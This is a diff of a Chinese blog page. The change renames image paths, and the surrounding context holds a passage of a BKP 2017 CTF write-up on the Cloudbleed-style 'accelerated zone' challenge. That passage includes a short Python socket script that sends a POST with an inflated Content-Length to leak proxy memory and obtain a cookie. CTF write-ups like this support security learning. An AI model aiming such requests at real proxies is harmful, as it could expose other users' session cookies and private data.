@@ -102,13 +102,13 @@
 <meta property="og:site_name" content="eviloH&#39;s space">
 <meta property="og:description" content="这两天做bkp ctf，算是我第一次认真参加的国际级比赛了。总的感受就是，相比国内的比赛，综合度要高得多，不容易看出题目的考察点。现在web手不会点binary都不好意思出来打比赛了，然而web都还没学好orz。总之，两天比下来还是感觉非常充实，学到了不少。对体力的消耗也很大，比完赛两天一直昏昏沉沉，直到现在才打起精神来总结一下。 首先说accelerated zone这道题。这题挂着web的名号">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://127.0.0.1:4000/images/bkp2017/nccontent.png">
-<meta property="og:image" content="http://127.0.0.1:4000/images/bkp2017/payload.png">
-<meta property="og:updated_time" content="2018-07-29T13:17:00.535Z">
+<meta property="og:image" content="http://127.0.0.1:4000/images/BKP2017/nccontent.png">
+<meta property="og:image" content="http://127.0.0.1:4000/images/BKP2017/payload.png">
+<meta property="og:updated_time" content="2018-07-29T13:18:20.176Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BKP2017-Writeup-Accelerated.zone">
 <meta name="twitter:description" content="这两天做bkp ctf，算是我第一次认真参加的国际级比赛了。总的感受就是，相比国内的比赛，综合度要高得多，不容易看出题目的考察点。现在web手不会点binary都不好意思出来打比赛了，然而web都还没学好orz。总之，两天比下来还是感觉非常充实，学到了不少。对体力的消耗也很大，比完赛两天一直昏昏沉沉，直到现在才打起精神来总结一下。 首先说accelerated zone这道题。这题挂着web的名号">
-<meta name="twitter:image" content="http://127.0.0.1:4000/images/bkp2017/nccontent.png">
+<meta name="twitter:image" content="http://127.0.0.1:4000/images/BKP2017/nccontent.png">
 
 
 
@@ -358,8 +358,8 @@
 <p>我又想着能否在自己的vps上开一个7733端口并且放一个一句话看反代服务器是否会下载到本地执行。结果虽然执行成功，但是却是在我自己的vps的执行结果，反代服务器只会返回解析后的结果。</p>
 <p>其实这里本来不用走这么多弯路，分析二进制文件的逆向代码就能搞清楚，无奈没有这个技能点。后来经过大佬提示，说这题的原型是cloudbleed .我赶紧现学现用了一下。既然这个漏洞的描述是长度不匹配，那么肯定是http头里面的Content-Length了。</p>
 <p>payload 如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">request = ”’POST / HTTP/<span class="number">1.1</span>\r\nHost: Your vps:<span class="number">8000</span>\r\nUser-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">50.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">50.0</span>\r\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,/;q=<span class="number">0.8</span>\r\nAccept-Language: zh-CN,zh;q=<span class="number">0.8</span>,en-US;q=<span class="number">0.5</span>,en;q=<span class="number">0.3</span>\r\nAccept-Encoding: gzip, deflate\r\nConnection: close Upgrade-Insecure-Requests: <span class="number">1</span>\r\nContent-Length: <span class="number">50000</span>\r\n\r\n123”’</span><br><span class="line">HOST = ‘<span class="number">54.218</span><span class="number">.82</span><span class="number">.219</span>’</span><br><span class="line">PORT = <span class="number">8000</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">request = bytes(request, encoding = “utf8”)</span><br><span class="line">s.send(request)</span><br></pre></td></tr></table></figure></p>
-<p>在自己的vps上打开7733端口，便可以收到代理服务器转发的请求。由于代理服务器没有验证Content-Length的长度和post提交的长度是否相等。如果Content-Length提交的长度大于post的实际长度，代理服务器就会将内存中这个报文之后的内容一起发过来，直到达到Content-Length的长度。由此造成了内存泄露。<br><img src="/images/bkp2017/nccontent.png" alt="nc"></p>
-<p>从泄露的内存中我们获得了一个cookie，将这个cookie带上发给accelerated.zone:8000，即Get flag：<br><img src="/images/bkp2017/payload.png" alt="nc"></p>
+<p>在自己的vps上打开7733端口，便可以收到代理服务器转发的请求。由于代理服务器没有验证Content-Length的长度和post提交的长度是否相等。如果Content-Length提交的长度大于post的实际长度，代理服务器就会将内存中这个报文之后的内容一起发过来，直到达到Content-Length的长度。由此造成了内存泄露。<br><img src="/images/BKP2017/nccontent.png" alt="nc"></p>
+<p>从泄露的内存中我们获得了一个cookie，将这个cookie带上发给accelerated.zone:8000，即Get flag：<br><img src="/images/BKP2017/payload.png" alt="nc"></p>
 <p>回顾这道题整个过程，实际上逆向的部分要远远大于web的部分，可见国际比赛考验的是选手的综合安全素养，这方面自己还要提高才行，多多向队伍里的大佬学习。同时，web思维走不通的地方，也应该多考虑下其他的方向。</p>
 
       
